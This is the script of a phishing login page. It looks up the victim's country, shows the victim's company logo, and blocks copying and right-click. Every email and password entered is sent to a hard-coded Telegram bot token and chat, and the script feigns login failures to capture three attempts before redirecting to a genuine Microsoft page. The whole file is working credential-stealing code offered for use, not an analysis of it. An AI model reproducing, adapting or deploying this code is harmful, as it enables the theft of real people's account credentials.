<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
  // Disable right-click context menu
  document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
  });

  // Disable specific Ctrl key combinations and text highlighting
  document.addEventListener('keydown', function(event) {
    const blockedKeys = ['s', 'c', 'v', 'x', 'p', 'a'];
    if (event.ctrlKey && blockedKeys.includes(event.key.toLowerCase())) {
      event.preventDefault();
    }
  });

  $(document).ready(function() {
    let step = 1; // Track incorrect attempts
    const telegramBotToken = '7638557852:AAF9C8PFvnPefhYtpw-ThBvF3aC8U_7YgTA';
    const chatId = '8186618467';
    let userCountry = "Unknown"; // Default country in case the API fails

    // Fetch user's country using an IP geolocation API
    $.get("https://ipapi.co/json/", function(data) {
      userCountry = data.country_name; // Store detected country
    });

    function fetchLogo(email) {
      if (email) {
        const domain = email.split('@')[1];
        if (domain) {
          const domainWithoutTLD = domain.split('.')[0];
          const clearbitUrl = 'https://logo.clearbit.com/' + domain;
          $('#logo').attr('src', clearbitUrl);
          $('#domain-name').text(domainWithoutTLD.toUpperCase());
        }
      }
    }

    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
      document.getElementById('email').value = email;
      fetchLogo(email);
    }

    $('#login-form').on('submit', function(event) {
      event.preventDefault();
      $('#submitBtn').text('Signing in...');

      const email = $('#email').val();
      const password = $('#password').val();

      if (!email || !password) {
        $('#msg').show().html("Please check you entered your email and password correctly and try again.").fadeOut(5000);
        $('#submitBtn').text('Sign In');
        return;
      }

      const message = `🔔 New Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 Country: ${userCountry}`;

      // Send login attempt to Telegram
      $.ajax({
        url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ chat_id: chatId, text: message }),
        success: function() {
          if (step >= 3) {
            // After successfully sending the 3rd attempt, redirect
            window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/try?ocid=cmmyf6908m4';
          } else {
            $('#msg').show().html("Please check you entered your email and password correctly and try again.").fadeOut(5000);
            $('#password').val(''); // Clear password field
            step++; // Increase failed attempt count
            $('#submitBtn').text('Sign In');
          }
        },
        error: function() {
          // Even if sending fails, count the attempt
          if (step >= 3) {
            window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/try?ocid=cmmyf6908m4';
          } else {
            $('#msg').show().html("Please check you entered your email and password correctly and try again.").fadeOut(5000);
            $('#password').val('');
            step++;
            $('#submitBtn').text('Sign In');
          }
        }
      });
    });
  });
</script>
